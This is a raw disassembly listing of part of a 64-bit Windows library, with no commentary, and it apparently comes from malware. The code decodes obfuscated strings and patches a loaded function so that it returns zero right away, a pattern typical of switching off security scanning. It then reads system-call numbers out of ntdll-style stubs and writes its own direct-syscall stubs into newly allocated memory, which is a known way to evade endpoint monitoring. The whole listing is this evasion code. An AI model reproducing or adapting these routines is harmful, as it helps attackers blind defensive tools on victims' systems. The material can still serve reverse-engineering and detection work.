   1800042a9:	c7 45 2f 47 00 2c 00 	movl   $0x2c0047,0x2f(%rbp)
   1800042b0:	e8 0b a2 00 00       	call   0x18000e4c0
   1800042b5:	48 8b c8             	mov    %rax,%rcx
   1800042b8:	ff 15 9a 1e 02 00    	call   *0x21e9a(%rip)        # 0x180026158
   1800042be:	48 8b f8             	mov    %rax,%rdi
   1800042c1:	48 85 c0             	test   %rax,%rax
   1800042c4:	75 07                	jne    0x1800042cd
   1800042c6:	32 d2                	xor    %dl,%dl
   1800042c8:	e9 61 02 00 00       	jmp    0x18000452e
   1800042cd:	66 0f 6f 0d 0b 0a 3a 	movdqa 0x3a0a0b(%rip),%xmm1        # 0x1803a4ce0
   1800042d4:	00 
   1800042d5:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   1800042d9:	33 c0                	xor    %eax,%eax
   1800042db:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800042df:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800042e4:	48 89 45 0d          	mov    %rax,0xd(%rbp)
   1800042e8:	89 45 15             	mov    %eax,0x15(%rbp)
   1800042eb:	66 89 45 19          	mov    %ax,0x19(%rbp)
   1800042ef:	66 0f 7e c8          	movd   %xmm1,%eax
   1800042f3:	88 45 ff             	mov    %al,-0x1(%rbp)
   1800042f6:	66 0f 7e c0          	movd   %xmm0,%eax
   1800042fa:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800042fe:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180004303:	88 45 00             	mov    %al,0x0(%rbp)
   180004306:	66 0f 7e c0          	movd   %xmm0,%eax
   18000430a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000430e:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180004313:	88 45 01             	mov    %al,0x1(%rbp)
   180004316:	66 0f 7e c0          	movd   %xmm0,%eax
   18000431a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000431e:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180004323:	88 45 02             	mov    %al,0x2(%rbp)
   180004326:	66 0f 7e c0          	movd   %xmm0,%eax
   18000432a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000432e:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180004333:	88 45 03             	mov    %al,0x3(%rbp)
   180004336:	66 0f 7e c0          	movd   %xmm0,%eax
   18000433a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000433e:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180004343:	88 45 04             	mov    %al,0x4(%rbp)
   180004346:	66 0f 7e c0          	movd   %xmm0,%eax
   18000434a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000434e:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180004353:	88 45 05             	mov    %al,0x5(%rbp)
   180004356:	66 0f 7e c0          	movd   %xmm0,%eax
   18000435a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000435e:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180004363:	88 45 06             	mov    %al,0x6(%rbp)
   180004366:	66 0f 7e c0          	movd   %xmm0,%eax
   18000436a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000436e:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180004373:	88 45 07             	mov    %al,0x7(%rbp)
   180004376:	66 0f 7e c0          	movd   %xmm0,%eax
   18000437a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000437e:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180004383:	88 45 08             	mov    %al,0x8(%rbp)
   180004386:	66 0f 7e c0          	movd   %xmm0,%eax
   18000438a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000438e:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180004393:	88 45 09             	mov    %al,0x9(%rbp)
   180004396:	66 0f 7e c0          	movd   %xmm0,%eax
   18000439a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000439e:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   1800043a3:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   1800043a8:	88 45 0a             	mov    %al,0xa(%rbp)
   1800043ab:	66 0f 7e c0          	movd   %xmm0,%eax
   1800043af:	88 45 0b             	mov    %al,0xb(%rbp)
   1800043b2:	66 0f 7e c8          	movd   %xmm1,%eax
   1800043b6:	88 45 0c             	mov    %al,0xc(%rbp)
   1800043b9:	e8 02 a2 00 00       	call   0x18000e5c0
   1800043be:	48 8b d0             	mov    %rax,%rdx
   1800043c1:	48 8b cf             	mov    %rdi,%rcx
   1800043c4:	ff 15 66 1d 02 00    	call   *0x21d66(%rip)        # 0x180026130
   1800043ca:	66 0f 6f 0d 0e 09 3a 	movdqa 0x3a090e(%rip),%xmm1        # 0x1803a4ce0
   1800043d1:	00 
   1800043d2:	48 8b d8             	mov    %rax,%rbx
   1800043d5:	33 c0                	xor    %eax,%eax
   1800043d7:	66 0f 7e c9          	movd   %xmm1,%ecx
   1800043db:	48 89 45 e5          	mov    %rax,-0x1b(%rbp)
   1800043df:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800043e3:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800043e8:	89 45 ed             	mov    %eax,-0x13(%rbp)
   1800043eb:	66 89 45 f1          	mov    %ax,-0xf(%rbp)
   1800043ef:	66 0f 7e c0          	movd   %xmm0,%eax
   1800043f3:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800043f7:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   1800043fc:	88 4d d7             	mov    %cl,-0x29(%rbp)
   1800043ff:	88 45 d8             	mov    %al,-0x28(%rbp)
   180004402:	66 0f 7e c0          	movd   %xmm0,%eax
   180004406:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000440a:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   18000440f:	88 45 d9             	mov    %al,-0x27(%rbp)
   180004412:	66 0f 7e c0          	movd   %xmm0,%eax
   180004416:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   18000441a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000441e:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180004423:	88 45 da             	mov    %al,-0x26(%rbp)
   180004426:	66 0f 7e c0          	movd   %xmm0,%eax
   18000442a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000442e:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180004433:	88 45 db             	mov    %al,-0x25(%rbp)
   180004436:	66 0f 7e c0          	movd   %xmm0,%eax
   18000443a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000443e:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180004443:	88 45 dc             	mov    %al,-0x24(%rbp)
   180004446:	66 0f 7e c0          	movd   %xmm0,%eax
   18000444a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000444e:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180004453:	88 45 dd             	mov    %al,-0x23(%rbp)
   180004456:	66 0f 7e c0          	movd   %xmm0,%eax
   18000445a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000445e:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180004463:	88 45 de             	mov    %al,-0x22(%rbp)
   180004466:	66 0f 7e c0          	movd   %xmm0,%eax
   18000446a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000446e:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180004473:	88 45 df             	mov    %al,-0x21(%rbp)
   180004476:	66 0f 7e c0          	movd   %xmm0,%eax
   18000447a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000447e:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180004483:	88 45 e0             	mov    %al,-0x20(%rbp)
   180004486:	66 0f 7e c0          	movd   %xmm0,%eax
   18000448a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000448e:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180004493:	88 45 e1             	mov    %al,-0x1f(%rbp)
   180004496:	66 0f 7e c0          	movd   %xmm0,%eax
   18000449a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000449e:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   1800044a3:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   1800044a8:	88 45 e2             	mov    %al,-0x1e(%rbp)
   1800044ab:	66 0f 7e c0          	movd   %xmm0,%eax
   1800044af:	88 45 e3             	mov    %al,-0x1d(%rbp)
   1800044b2:	66 0f 7e c8          	movd   %xmm1,%eax
   1800044b6:	88 45 e4             	mov    %al,-0x1c(%rbp)
   1800044b9:	e8 02 a1 00 00       	call   0x18000e5c0
   1800044be:	33 ff                	xor    %edi,%edi
   1800044c0:	48 85 db             	test   %rbx,%rbx
   1800044c3:	75 04                	jne    0x1800044c9
   1800044c5:	32 d2                	xor    %dl,%dl
   1800044c7:	eb 44                	jmp    0x18000450d
   1800044c9:	4c 8d 4d f7          	lea    -0x9(%rbp),%r9
   1800044cd:	89 7d f7             	mov    %edi,-0x9(%rbp)
   1800044d0:	ba 03 00 00 00       	mov    $0x3,%edx
   1800044d5:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1800044db:	48 8b cb             	mov    %rbx,%rcx
   1800044de:	ff 15 e4 1b 02 00    	call   *0x21be4(%rip)        # 0x1800260c8
   1800044e4:	85 c0                	test   %eax,%eax
   1800044e6:	75 04                	jne    0x1800044ec
   1800044e8:	32 d2                	xor    %dl,%dl
   1800044ea:	eb 21                	jmp    0x18000450d
   1800044ec:	44 8b 45 f7          	mov    -0x9(%rbp),%r8d
   1800044f0:	4c 8d 4d f7          	lea    -0x9(%rbp),%r9
   1800044f4:	ba 03 00 00 00       	mov    $0x3,%edx
   1800044f9:	66 c7 03 33 c0       	movw   $0xc033,(%rbx)
   1800044fe:	48 8b cb             	mov    %rbx,%rcx
   180004501:	c6 43 02 c3          	movb   $0xc3,0x2(%rbx)
   180004505:	ff 15 bd 1b 02 00    	call   *0x21bbd(%rip)        # 0x1800260c8
   18000450b:	b2 01                	mov    $0x1,%dl
   18000450d:	48 8b c7             	mov    %rdi,%rax
   180004510:	40 88 7c 05 e5       	mov    %dil,-0x1b(%rbp,%rax,1)
   180004515:	48 ff c0             	inc    %rax
   180004518:	48 83 f8 0e          	cmp    $0xe,%rax
   18000451c:	72 f2                	jb     0x180004510
   18000451e:	66 90                	xchg   %ax,%ax
   180004520:	c6 44 3d 0d 00       	movb   $0x0,0xd(%rbp,%rdi,1)
   180004525:	48 ff c7             	inc    %rdi
   180004528:	48 83 ff 0e          	cmp    $0xe,%rdi
   18000452c:	72 f2                	jb     0x180004520
   18000452e:	33 c0                	xor    %eax,%eax
   180004530:	48 8d 7d 33          	lea    0x33(%rbp),%rdi
   180004534:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004539:	f3 aa                	rep stos %al,(%rdi)
   18000453b:	0f b6 c2             	movzbl %dl,%eax
   18000453e:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   180004542:	48 33 cc             	xor    %rsp,%rcx
   180004545:	e8 66 a6 00 00       	call   0x18000ebb0
   18000454a:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   180004551:	00 
   180004552:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180004556:	49 8b 73 18          	mov    0x18(%r11),%rsi
   18000455a:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   18000455e:	49 8b e3             	mov    %r11,%rsp
   180004561:	5d                   	pop    %rbp
   180004562:	c3                   	ret
   180004563:	cc                   	int3
   180004564:	cc                   	int3
   180004565:	cc                   	int3
   180004566:	cc                   	int3
   180004567:	cc                   	int3
   180004568:	cc                   	int3
   180004569:	cc                   	int3
   18000456a:	cc                   	int3
   18000456b:	cc                   	int3
   18000456c:	cc                   	int3
   18000456d:	cc                   	int3
   18000456e:	cc                   	int3
   18000456f:	cc                   	int3
   180004570:	40 55                	rex push %rbp
   180004572:	53                   	push   %rbx
   180004573:	56                   	push   %rsi
   180004574:	57                   	push   %rdi
   180004575:	41 54                	push   %r12
   180004577:	48 8d ac 24 60 ff ff 	lea    -0xa0(%rsp),%rbp
   18000457e:	ff 
   18000457f:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   180004586:	48 8b 05 73 4a 3a 00 	mov    0x3a4a73(%rip),%rax        # 0x1803a9000
   18000458d:	48 33 c4             	xor    %rsp,%rax
   180004590:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   180004597:	33 c0                	xor    %eax,%eax
   180004599:	c7 44 24 40 4d 00 50 	movl   $0x50004d,0x40(%rsp)
   1800045a0:	00 
   1800045a1:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800045a4:	89 44 24 34          	mov    %eax,0x34(%rsp)
   1800045a8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800045ad:	89 44 24 64          	mov    %eax,0x64(%rsp)
   1800045b1:	0f 11 44 24 54       	movups %xmm0,0x54(%rsp)
   1800045b6:	c7 44 24 44 41 00 4a 	movl   $0x4a0041,0x44(%rsp)
   1800045bd:	00 
   1800045be:	c7 44 24 48 4b 00 06 	movl   $0x6004b,0x48(%rsp)
   1800045c5:	00 
   1800045c6:	c7 44 24 4c 4d 00 46 	movl   $0x46004d,0x4c(%rsp)
   1800045cd:	00 
   1800045ce:	c7 44 24 50 47 00 2c 	movl   $0x2c0047,0x50(%rsp)
   1800045d5:	00 
   1800045d6:	e8 e5 9e 00 00       	call   0x18000e4c0
   1800045db:	48 8b c8             	mov    %rax,%rcx
   1800045de:	ff 15 74 1b 02 00    	call   *0x21b74(%rip)        # 0x180026158
   1800045e4:	4c 8b e0             	mov    %rax,%r12
   1800045e7:	48 85 c0             	test   %rax,%rax
   1800045ea:	75 07                	jne    0x1800045f3
   1800045ec:	32 d2                	xor    %dl,%dl
   1800045ee:	e9 ab 04 00 00       	jmp    0x180004a9e
   1800045f3:	66 0f 6f 15 f5 04 3a 	movdqa 0x3a04f5(%rip),%xmm2        # 0x1803a4af0
   1800045fa:	00 
   1800045fb:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1800045ff:	66 0f 6f 0d 99 0a 3a 	movdqa 0x3a0a99(%rip),%xmm1        # 0x1803a50a0
   180004606:	00 
   180004607:	33 c0                	xor    %eax,%eax
   180004609:	48 89 45 22          	mov    %rax,0x22(%rbp)
   18000460d:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004610:	66 89 45 2a          	mov    %ax,0x2a(%rbp)
   180004614:	0f 11 45 12          	movups %xmm0,0x12(%rbp)
   180004618:	c7 44 24 30 67 5c 47 	movl   $0x53475c67,0x30(%rsp)
   18000461f:	53 
   180004620:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004623:	66 c7 44 24 34 56 5c 	movw   $0x5c56,0x34(%rsp)
   18000462a:	0f 11 45 b7          	movups %xmm0,-0x49(%rbp)
   18000462e:	4c 89 ac 24 d0 01 00 	mov    %r13,0x1d0(%rsp)
   180004635:	00 
   180004636:	0f 11 45 78          	movups %xmm0,0x78(%rbp)
   18000463a:	4c 89 b4 24 d8 01 00 	mov    %r14,0x1d8(%rsp)
   180004641:	00 
   180004642:	0f 11 4d f8          	movups %xmm1,-0x8(%rbp)
   180004646:	4c 89 bc 24 e0 01 00 	mov    %r15,0x1e0(%rsp)
   18000464d:	00 
   18000464e:	66 0f 6f 0d 8a 0a 3a 	movdqa 0x3a0a8a(%rip),%xmm1        # 0x1803a50e0
   180004655:	00 
   180004656:	0f 11 4d a0          	movups %xmm1,-0x60(%rbp)
   18000465a:	c6 45 b6 39          	movb   $0x39,-0x4a(%rbp)
   18000465e:	0f 11 4d 60          	movups %xmm1,0x60(%rbp)
   180004662:	c6 45 e2 35          	movb   $0x35,-0x1e(%rbp)
   180004666:	66 0f 6f 0d e2 09 3a 	movdqa 0x3a09e2(%rip),%xmm1        # 0x1803a5050
   18000466d:	00 
   18000466e:	0f 11 4d d0          	movups %xmm1,-0x30(%rbp)
   180004672:	c6 45 86 39          	movb   $0x39,-0x7a(%rbp)
   180004676:	66 0f 6f 0d 52 09 3a 	movdqa 0x3a0952(%rip),%xmm1        # 0x1803a4fd0
   18000467d:	00 
   18000467e:	66 0f c5 c2 04       	pextrw $0x4,%xmm2,%eax
   180004683:	0f 11 4d 30          	movups %xmm1,0x30(%rbp)
   180004687:	66 0f 6f 0d 71 0a 3a 	movdqa 0x3a0a71(%rip),%xmm1        # 0x1803a5100
   18000468e:	00 
   18000468f:	66 89 45 10          	mov    %ax,0x10(%rbp)
   180004693:	33 c0                	xor    %eax,%eax
   180004695:	88 44 24 37          	mov    %al,0x37(%rsp)
   180004699:	89 45 c7             	mov    %eax,-0x39(%rbp)
   18000469c:	66 89 45 cb          	mov    %ax,-0x35(%rbp)
   1800046a0:	88 45 cd             	mov    %al,-0x33(%rbp)
   1800046a3:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800046a7:	89 45 b0             	mov    %eax,-0x50(%rbp)
   1800046aa:	0f b7 44 24 34       	movzwl 0x34(%rsp),%eax
   1800046af:	66 89 45 b4          	mov    %ax,-0x4c(%rbp)
   1800046b3:	33 c0                	xor    %eax,%eax
   1800046b5:	c7 44 24 30 63 46 5a 	movl   $0x555a4663,0x30(%rsp)
   1800046bc:	55 
   1800046bd:	c7 44 24 34 52 4b 4a 	movl   $0x3a4a4b52,0x34(%rsp)
   1800046c4:	3a 
   1800046c5:	f2 0f 10 44 24 30    	movsd  0x30(%rsp),%xmm0
   1800046cb:	89 44 24 33          	mov    %eax,0x33(%rsp)
   1800046cf:	88 44 24 37          	mov    %al,0x37(%rsp)
   1800046d3:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1800046da:	66 89 45 f3          	mov    %ax,-0xd(%rbp)
   1800046de:	88 45 f5             	mov    %al,-0xb(%rbp)
   1800046e1:	f2 0f 11 45 70       	movsd  %xmm0,0x70(%rbp)
   1800046e6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800046e9:	66 c7 44 24 30 40 47 	movw   $0x4740,0x30(%rsp)
   1800046f0:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   1800046f5:	66 89 45 e0          	mov    %ax,-0x20(%rbp)
   1800046f9:	33 c0                	xor    %eax,%eax
   1800046fb:	0f 11 45 e3          	movups %xmm0,-0x1d(%rbp)
   1800046ff:	48 89 45 58          	mov    %rax,0x58(%rbp)
   180004703:	0f 11 45 48          	movups %xmm0,0x48(%rbp)
   180004707:	89 45 97             	mov    %eax,-0x69(%rbp)
   18000470a:	66 89 45 9b          	mov    %ax,-0x65(%rbp)
   18000470e:	88 45 9d             	mov    %al,-0x63(%rbp)
   180004711:	c7 44 24 30 5f 79 50 	movl   $0x5b50795f,0x30(%rsp)
   180004718:	5b 
   180004719:	c7 44 24 34 58 4a 40 	movl   $0x3a404a58,0x34(%rsp)
   180004720:	3a 
   180004721:	f2 0f 10 44 24 30    	movsd  0x30(%rsp),%xmm0
   180004727:	f2 0f 11 45 40       	movsd  %xmm0,0x40(%rbp)
   18000472c:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000472f:	c7 44 24 30 7e 51 58 	movl   $0x5958517e,0x30(%rsp)
   180004736:	59 
   180004737:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000473b:	89 45 80             	mov    %eax,-0x80(%rbp)
   18000473e:	66 c7 44 24 34 45 41 	movw   $0x4145,0x34(%rsp)
   180004745:	0f b7 44 24 34       	movzwl 0x34(%rsp),%eax
   18000474a:	66 89 45 84          	mov    %ax,-0x7c(%rbp)
   18000474e:	f2 0f 11 55 08       	movsd  %xmm2,0x8(%rbp)
   180004753:	0f 11 45 87          	movups %xmm0,-0x79(%rbp)
   180004757:	0f 11 4c 24 70       	movups %xmm1,0x70(%rsp)
   18000475c:	e8 3f 98 00 00       	call   0x18000dfa0
   180004761:	48 8b d0             	mov    %rax,%rdx
   180004764:	49 8b cc             	mov    %r12,%rcx
   180004767:	ff 15 c3 19 02 00    	call   *0x219c3(%rip)        # 0x180026130
   18000476d:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   180004771:	4c 8b f8             	mov    %rax,%r15
   180004774:	e8 d7 97 00 00       	call   0x18000df50
   180004779:	48 8b d0             	mov    %rax,%rdx
   18000477c:	49 8b cc             	mov    %r12,%rcx
   18000477f:	ff 15 ab 19 02 00    	call   *0x219ab(%rip)        # 0x180026130
   180004785:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   180004789:	48 8b f8             	mov    %rax,%rdi
   18000478c:	e8 6f 97 00 00       	call   0x18000df00
   180004791:	48 8b d0             	mov    %rax,%rdx
   180004794:	49 8b cc             	mov    %r12,%rcx
   180004797:	ff 15 93 19 02 00    	call   *0x21993(%rip)        # 0x180026130
   18000479d:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1800047a1:	48 8b d8             	mov    %rax,%rbx
   1800047a4:	e8 07 97 00 00       	call   0x18000deb0
   1800047a9:	48 8b d0             	mov    %rax,%rdx
   1800047ac:	49 8b cc             	mov    %r12,%rcx
   1800047af:	ff 15 7b 19 02 00    	call   *0x2197b(%rip)        # 0x180026130
   1800047b5:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1800047b9:	48 8b f0             	mov    %rax,%rsi
   1800047bc:	e8 3f 97 00 00       	call   0x18000df00
   1800047c1:	48 8b d0             	mov    %rax,%rdx
   1800047c4:	49 8b cc             	mov    %r12,%rcx
   1800047c7:	ff 15 63 19 02 00    	call   *0x21963(%rip)        # 0x180026130
   1800047cd:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800047d2:	4c 8b f0             	mov    %rax,%r14
   1800047d5:	e8 76 97 00 00       	call   0x18000df50
   1800047da:	48 8b d0             	mov    %rax,%rdx
   1800047dd:	49 8b cc             	mov    %r12,%rcx
   1800047e0:	ff 15 4a 19 02 00    	call   *0x2194a(%rip)        # 0x180026130
   1800047e6:	4d 85 ff             	test   %r15,%r15
   1800047e9:	0f 84 2b 02 00 00    	je     0x180004a1a
   1800047ef:	48 85 ff             	test   %rdi,%rdi
   1800047f2:	0f 84 22 02 00 00    	je     0x180004a1a
   1800047f8:	48 85 db             	test   %rbx,%rbx
   1800047fb:	0f 84 19 02 00 00    	je     0x180004a1a
   180004801:	48 85 f6             	test   %rsi,%rsi
   180004804:	0f 84 10 02 00 00    	je     0x180004a1a
   18000480a:	4d 85 f6             	test   %r14,%r14
   18000480d:	0f 84 07 02 00 00    	je     0x180004a1a
   180004813:	48 85 c0             	test   %rax,%rax
   180004816:	0f 84 fe 01 00 00    	je     0x180004a1a
   18000481c:	41 80 3f 4c          	cmpb   $0x4c,(%r15)
   180004820:	75 1b                	jne    0x18000483d
   180004822:	41 80 7f 01 8b       	cmpb   $0x8b,0x1(%r15)
   180004827:	75 14                	jne    0x18000483d
   180004829:	41 80 7f 02 d1       	cmpb   $0xd1,0x2(%r15)
   18000482e:	75 0d                	jne    0x18000483d
   180004830:	41 80 7f 03 b8       	cmpb   $0xb8,0x3(%r15)
   180004835:	75 06                	jne    0x18000483d
   180004837:	45 8b 6f 04          	mov    0x4(%r15),%r13d
   18000483b:	eb 06                	jmp    0x180004843
   18000483d:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   180004843:	80 3f 4c             	cmpb   $0x4c,(%rdi)
   180004846:	75 18                	jne    0x180004860
   180004848:	80 7f 01 8b          	cmpb   $0x8b,0x1(%rdi)
   18000484c:	75 12                	jne    0x180004860
   18000484e:	80 7f 02 d1          	cmpb   $0xd1,0x2(%rdi)
   180004852:	75 0c                	jne    0x180004860
   180004854:	80 7f 03 b8          	cmpb   $0xb8,0x3(%rdi)
   180004858:	75 06                	jne    0x180004860
   18000485a:	44 8b 67 04          	mov    0x4(%rdi),%r12d
   18000485e:	eb 06                	jmp    0x180004866
   180004860:	41 bc ff ff ff ff    	mov    $0xffffffff,%r12d
   180004866:	80 3b 4c             	cmpb   $0x4c,(%rbx)
   180004869:	75 18                	jne    0x180004883
   18000486b:	80 7b 01 8b          	cmpb   $0x8b,0x1(%rbx)
   18000486f:	75 12                	jne    0x180004883
   180004871:	80 7b 02 d1          	cmpb   $0xd1,0x2(%rbx)
   180004875:	75 0c                	jne    0x180004883
   180004877:	80 7b 03 b8          	cmpb   $0xb8,0x3(%rbx)
   18000487b:	75 06                	jne    0x180004883
   18000487d:	44 8b 7b 04          	mov    0x4(%rbx),%r15d
   180004881:	eb 06                	jmp    0x180004889
   180004883:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   180004889:	80 3e 4c             	cmpb   $0x4c,(%rsi)
   18000488c:	75 17                	jne    0x1800048a5
   18000488e:	80 7e 01 8b          	cmpb   $0x8b,0x1(%rsi)
   180004892:	75 11                	jne    0x1800048a5
   180004894:	80 7e 02 d1          	cmpb   $0xd1,0x2(%rsi)
   180004898:	75 0b                	jne    0x1800048a5
   18000489a:	80 7e 03 b8          	cmpb   $0xb8,0x3(%rsi)
   18000489e:	75 05                	jne    0x1800048a5
   1800048a0:	8b 76 04             	mov    0x4(%rsi),%esi
   1800048a3:	eb 05                	jmp    0x1800048aa
   1800048a5:	be ff ff ff ff       	mov    $0xffffffff,%esi
   1800048aa:	41 80 3e 4c          	cmpb   $0x4c,(%r14)
   1800048ae:	75 1b                	jne    0x1800048cb
   1800048b0:	41 80 7e 01 8b       	cmpb   $0x8b,0x1(%r14)
   1800048b5:	75 14                	jne    0x1800048cb
   1800048b7:	41 80 7e 02 d1       	cmpb   $0xd1,0x2(%r14)
   1800048bc:	75 0d                	jne    0x1800048cb
   1800048be:	41 80 7e 03 b8       	cmpb   $0xb8,0x3(%r14)
   1800048c3:	75 06                	jne    0x1800048cb
   1800048c5:	41 8b 7e 04          	mov    0x4(%r14),%edi
   1800048c9:	eb 05                	jmp    0x1800048d0
   1800048cb:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   1800048d0:	80 38 4c             	cmpb   $0x4c,(%rax)
   1800048d3:	75 17                	jne    0x1800048ec
   1800048d5:	80 78 01 8b          	cmpb   $0x8b,0x1(%rax)
   1800048d9:	75 11                	jne    0x1800048ec
   1800048db:	80 78 02 d1          	cmpb   $0xd1,0x2(%rax)
   1800048df:	75 0b                	jne    0x1800048ec
   1800048e1:	80 78 03 b8          	cmpb   $0xb8,0x3(%rax)
   1800048e5:	75 05                	jne    0x1800048ec
   1800048e7:	8b 58 04             	mov    0x4(%rax),%ebx
   1800048ea:	eb 05                	jmp    0x1800048f1
   1800048ec:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1800048f1:	41 83 fd ff          	cmp    $0xffffffff,%r13d
   1800048f5:	0f 84 1f 01 00 00    	je     0x180004a1a
   1800048fb:	41 83 fc ff          	cmp    $0xffffffff,%r12d
   1800048ff:	0f 84 15 01 00 00    	je     0x180004a1a
   180004905:	41 83 ff ff          	cmp    $0xffffffff,%r15d
   180004909:	0f 84 0b 01 00 00    	je     0x180004a1a
   18000490f:	83 fe ff             	cmp    $0xffffffff,%esi
   180004912:	0f 84 02 01 00 00    	je     0x180004a1a
   180004918:	83 ff ff             	cmp    $0xffffffff,%edi
   18000491b:	0f 84 f9 00 00 00    	je     0x180004a1a
   180004921:	83 fb ff             	cmp    $0xffffffff,%ebx
   180004924:	0f 84 f0 00 00 00    	je     0x180004a1a
   18000492a:	ba 80 00 00 00       	mov    $0x80,%edx
   18000492f:	33 c9                	xor    %ecx,%ecx
   180004931:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180004937:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   18000493d:	ff 15 ed 16 02 00    	call   *0x216ed(%rip)        # 0x180026030
   180004943:	48 89 05 86 6e 3a 00 	mov    %rax,0x3a6e86(%rip)        # 0x1803ab7d0
   18000494a:	48 85 c0             	test   %rax,%rax
   18000494d:	0f 84 c7 00 00 00    	je     0x180004a1a
   180004953:	48 8d 48 10          	lea    0x10(%rax),%rcx
   180004957:	c7 40 20 4c 8b d1 b8 	movl   $0xb8d18b4c,0x20(%rax)
   18000495e:	c7 01 4c 8b d1 b8    	movl   $0xb8d18b4c,(%rcx)
   180004964:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   180004969:	44 89 61 04          	mov    %r12d,0x4(%rcx)
   18000496d:	ba 80 00 00 00       	mov    $0x80,%edx
   180004972:	66 c7 41 08 0f 05    	movw   $0x50f,0x8(%rcx)
   180004978:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   18000497e:	c6 41 0a c3          	movb   $0xc3,0xa(%rcx)
   180004982:	48 89 0d 27 6e 3a 00 	mov    %rcx,0x3a6e27(%rip)        # 0x1803ab7b0
   180004989:	48 8d 48 20          	lea    0x20(%rax),%rcx
   18000498d:	44 89 79 04          	mov    %r15d,0x4(%rcx)
   180004991:	66 c7 41 08 0f 05    	movw   $0x50f,0x8(%rcx)
   180004997:	c6 41 0a c3          	movb   $0xc3,0xa(%rcx)
   18000499b:	48 89 0d 36 6e 3a 00 	mov    %rcx,0x3a6e36(%rip)        # 0x1803ab7d8
   1800049a2:	48 8d 48 30          	lea    0x30(%rax),%rcx
   1800049a6:	89 78 44             	mov    %edi,0x44(%rax)
   1800049a9:	48 8d 78 50          	lea    0x50(%rax),%rdi
   1800049ad:	c7 01 4c 8b d1 b8    	movl   $0xb8d18b4c,(%rcx)
   1800049b3:	89 71 04             	mov    %esi,0x4(%rcx)
   1800049b6:	66 c7 41 08 0f 05    	movw   $0x50f,0x8(%rcx)
   1800049bc:	c6 41 0a c3          	movb   $0xc3,0xa(%rcx)
